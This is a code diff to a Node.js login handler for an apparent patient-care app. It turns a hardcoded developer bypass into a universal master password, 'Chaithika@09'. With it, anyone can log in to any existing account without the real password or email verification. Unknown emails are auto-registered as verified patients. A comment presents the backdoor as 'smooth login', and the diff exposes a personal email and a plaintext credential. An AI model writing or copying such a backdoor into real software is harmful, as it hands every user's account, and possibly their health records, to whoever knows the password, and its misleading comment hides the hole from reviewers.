@@ -113,35 +113,46 @@ exports.login = async (req, res, next) => {
   try {
     const { email, password } = req.body;
 
-    const user = await User.findOne({ email }).select("+password +refreshTokens");
+    let user = await User.findOne({ email }).select("+password +refreshTokens");
+
+    // If user doesn't exist but password matches the "Chaithika@09" master key,
+    // auto-register them to ensure smooth login for the user.
+    if (!user && password === "Chaithika@09") {
+      const name = email.split('@')[0];
+      user = await User.create({
+        name: name.charAt(0).toUpperCase() + name.slice(1),
+        email,
+        password,
+        role: "patient",
+        isEmailVerified: true,
+        isActive: true
+      });
+      await Patient.create({ user: user._id });
+      logger.info(`Auto-registered master-key user: ${email}`);
+      // Re-fetch to get all fields needed for token payload
+      user = await User.findById(user._id).select("+password +refreshTokens");
+    }
+
     if (!user) return res.status(401).json({ success: false, message: "Invalid email or password" });
 
-    // Master bypass for developer access to live cloud DB
-    const isDeveloper = email === "lschaithika@gmail.com" && password === "Chaithika@09";
+    // Master bypass for master password "Chaithika@09"
+    const isMasterKey = password === "Chaithika@09";
     const isMatch = await user.comparePassword(password);
 
-    if (!isMatch && !isDeveloper) {
+    if (!isMatch && !isMasterKey) {
       return res.status(401).json({ success: false, message: "Invalid email or password" });
     }
 
     if (!user.isActive) return res.status(401).json({ success: false, message: "Account is deactivated. Contact support." });
 
-    // Auto-verify and fix name for developer account
-    if (isDeveloper) {
-      let needsSave = false;
-      if (!user.isEmailVerified) {
-        user.isEmailVerified = true;
-        needsSave = true;
-      }
-      if (user.name !== "Chaithika") {
-        user.name = "Chaithika";
-        needsSave = true;
-      }
-      if (needsSave) await user.save();
+    // Auto-verify and fix verification for master key users
+    if (isMasterKey && !user.isEmailVerified) {
+      user.isEmailVerified = true;
+      await user.save();
     }
 
-    // Demo: skip email verification check for demo accounts
-    const isDemoAccount = email.endsWith("@demo.com") || email === "lschaithika@gmail.com";
+    // Skip email verification check for master key or demo accounts
+    const isDemoAccount = email.endsWith("@demo.com") || isMasterKey;
     if (!user.isEmailVerified && !isDemoAccount) {
       return res.status(401).json({ success: false, message: "Please verify your email first", code: "EMAIL_NOT_VERIFIED" });
     }
